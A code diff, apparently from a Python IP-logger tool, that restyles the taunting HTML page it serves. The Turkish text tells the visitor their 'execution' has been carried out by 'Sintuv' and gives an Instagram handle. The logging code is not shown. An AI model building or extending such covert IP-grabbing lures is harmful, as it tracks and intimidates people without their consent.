@@ -26,14 +26,14 @@ def ip_logger():
     except Exception as e:
         print(e)
 
-    # Şık, modern koyu tema ve ortada büyük yazı alanı içeren tasarım
+    # Yeni ve sade/karizmatik tasarım
     html_content = """
     <!DOCTYPE html>
     <html lang="tr">
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>Hoş Geldiniz</title>
+        <title>Sintuv</title>
         <style>
             * {
                 margin: 0;
@@ -41,8 +41,8 @@ def ip_logger():
                 box-sizing: border-box;
             }
             body {
-                background-color: #0f172a;
-                color: #f8fafc;
+                background-color: #090d16;
+                color: #f1f5f9;
                 font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                 height: 100vh;
                 display: flex;
@@ -51,39 +51,50 @@ def ip_logger():
             }
             .container {
                 text-align: center;
-                background: rgba(30, 41, 59, 0.7);
-                padding: 40px;
-                border-radius: 16px;
-                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
-                backdrop-filter: blur(10px);
+                background: #111827;
+                padding: 50px 40px;
+                border-radius: 20px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
                 max-width: 600px;
                 width: 90%;
-                border: 1px solid rgba(255, 255, 255, 0.1);
+                border: 1px solid rgba(239, 68, 68, 0.2);
             }
             h1 {
-                font-size: 2.5rem;
-                margin-bottom: 20px;
-                color: #38bdf8;
+                font-size: 2.2rem;
+                margin-bottom: 25px;
+                color: #ef4444;
                 letter-spacing: 1px;
+                text-shadow: 0 0 15px rgba(239, 68, 68, 0.3);
             }
             .textbox {
-                background: #1e293b;
-                border: 2px solid #334155;
-                color: #cbd5e1;
-                padding: 20px;
-                border-radius: 10px;
-                font-size: 1.2rem;
-                margin-top: 15px;
-                outline: none;
-                box-shadow: inset 0 2px 4px rgba(0,0,0,0.2);
+                background: #1f2937;
+                border: 1px solid #374151;
+                color: #e2e8f0;
+                padding: 25px;
+                border-radius: 12px;
+                font-size: 1.3rem;
+                margin-bottom: 30px;
+                box-shadow: inset 0 2px 4px rgba(0,0,0,0.3);
+            }
+            .footer {
+                font-size: 1.1rem;
+                color: #94a3b8;
+                letter-spacing: 1.5px;
+                font-weight: 600;
+            }
+            .footer span {
+                color: #38bdf8;
             }
         </style>
     </head>
     <body>
         <div class="container">
-            <h1> Sintuv0 Tarafından infazınız verilmiştir </h1>
+            <h1>Sintuv tarafından infazınız verilmiştir</h1>
             <div class="textbox">
-                gecmis olsun bebegim
+                Geçmiş olsun.
+            </div>
+            <div class="footer">
+                İG : <span>Sintuv0</span>
             </div>
         </div>
     </body>
